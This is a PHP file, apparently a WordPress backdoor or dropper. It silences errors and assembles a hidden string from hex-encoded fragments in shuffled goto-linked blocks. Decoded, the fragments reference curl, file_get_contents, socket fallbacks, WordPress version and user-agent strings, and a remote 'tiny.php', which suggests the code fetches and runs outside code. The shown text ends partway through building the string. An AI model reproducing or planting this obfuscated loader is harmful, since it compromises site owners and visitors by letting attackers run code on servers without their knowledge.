<?php
error_reporting(0);
$cfyzo=''; goto _695AF14F98EFA;
_695AF14F98F56: $cfyzo.="\x24\x77\x70\x5f\x63\x6f\x6e\x74\x65\x78\x74\x20"; goto _695AF14F98F57;
_695AF14F98F37: $cfyzo.="\x29\x20\x2e\x20\x27\x74\x69\x6e\x79\x2e\x70\x68"; goto _695AF14F98F38;
_695AF14F99005: $cfyzo.="\x20\x65\x6c\x73\x65\x20\x7b\x0d\x0a\x20\x20\x20"; goto _695AF14F99006;
_695AF14F98FCF: $cfyzo.="\x20\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x66"; goto _695AF14F98FD0;
_695AF14F99007: $cfyzo.="\x2a\x20\x45\x72\x72\x6f\x72\x20\x68\x61\x6e\x64"; goto _695AF14F99008;
_695AF14F98FE3: $cfyzo.="\x20\x20\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20"; goto _695AF14F98FE4;
_695AF14F98F59: $cfyzo.="\x61\x72\x72\x61\x79\x28\x0d\x0a\x20\x20\x20\x20"; goto _695AF14F98F5A;
_695AF14F98F69: $cfyzo.="\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e"; goto _695AF14F98F6A;
_695AF14F98F9A: $cfyzo.="\x20\x27\x36\x2e\x35\x27\x29\x0d\x0a\x20\x20\x20"; goto _695AF14F98F9B;
_695AF14F98FD2: $cfyzo.="\x20\x24\x77\x70\x5f\x64\x62\x5f\x71\x75\x65\x72"; goto _695AF14F98FD3;
_695AF14F98FA4: $cfyzo.="\x6b\x65\x74\x20\x63\x6f\x6e\x6e\x65\x63\x74\x69"; goto _695AF14F98FA5;
_695AF14F98FE2: $cfyzo.="\x6f\x6e\x29\x3b\x0d\x0a\x20\x20\x20\x20\x20\x20"; goto _695AF14F98FE3;
_695AF14F98F4D: $cfyzo.="\x73\x74\x65\x6d\x20\x41\x50\x49\x20\x77\x68\x65"; goto _695AF14F98F4E;
_695AF14F98F79: $cfyzo.="\x6e\x5f\x65\x78\x69\x73\x74\x73\x28\x27\x63\x75"; goto _695AF14F98F7A;
_695AF14F98F61: $cfyzo.="\x64\x50\x72\x65\x73\x73\x2f\x27\x20\x2e\x20\x28"; goto _695AF14F98F62;
_695AF14F98FE0: $cfyzo.="\x20\x20\x66\x63\x6c\x6f\x73\x65\x28\x24\x77\x70"; goto _695AF14F98FE1;
_695AF14F98FA5: $cfyzo.="\x6f\x6e\x20\x61\x73\x20\x66\x69\x6e\x61\x6c\x20"; goto _695AF14F98FA6;
_695AF14F98FFB: $cfyzo.="\x66\x61\x6c\x73\x65\x20\x26\x26\x20\x21\x65\x6d"; goto _695AF14F98FFC;
_695AF14F98F76: $cfyzo.="\x69\x6e\x67\x0d\x0a\x20\x2a\x2f\x0d\x0a\x69\x66"; goto _695AF14F98F77;
_695AF14F99017: $cfyzo.="\x69\x74\x28\x27\x44\x61\x74\x61\x62\x61\x73\x65"; goto _695AF14F99018;
_695AF14F98F55: $cfyzo.="\x72\x65\x63\x74\x27\x3b\x0d\x0a\x20\x20\x20\x20"; goto _695AF14F98F56;
_695AF14F98F99: $cfyzo.="\x77\x70\x5f\x76\x65\x72\x73\x69\x6f\x6e\x20\x3a"; goto _695AF14F98F9A;
_695AF14F98F88: $cfyzo.="\x55\x52\x4e\x54\x52\x41\x4e\x53\x46\x45\x52\x20"; goto _695AF14F98F89;
_695AF14F98F7E: $cfyzo.="\x3b\x0d\x0a\x20\x20\x20\x20\x63\x75\x72\x6c\x5f"; goto _695AF14F98F7F;
_695AF14F98FB8: $cfyzo.="\x20\x20\x24\x77\x70\x5f\x64\x62\x5f\x63\x6f\x6e"; goto _695AF14F98FB9;
_695AF14F9900C: $cfyzo.="\x20\x20\x20\x2a\x2f\x0d\x0a\x20\x20\x20\x20\x69"; goto _695AF14F9900D;
_695AF14F98F9B: $cfyzo.="\x20\x29\x29\x3b\x0d\x0a\x20\x20\x20\x20\x24\x77"; goto _695AF14F98F9C;
_695AF14F98F52: $cfyzo.="\x29\x20\x7b\x0d\x0a\x20\x20\x20\x20\x24\x77\x70"; goto _695AF14F98F53;
_695AF14F98F98: $cfyzo.="\x76\x65\x72\x73\x69\x6f\x6e\x29\x20\x3f\x20\x24"; goto _695AF14F98F99;
_695AF14F98F83: $cfyzo.="\x20\x20\x20\x20\x20\x20\x20\x20\x43\x55\x52\x4c"; goto _695AF14F98F84;
_695AF14F99004: $cfyzo.="\x29\x3b\x0d\x0a\x20\x20\x20\x20\x7d\x0d\x0a\x7d"; goto _695AF14F99005;
_695AF14F98F66: $cfyzo.="\x20\x20\x20\x29\x0d\x0a\x20\x20\x20\x20\x29\x29"; goto _695AF14F98F67;
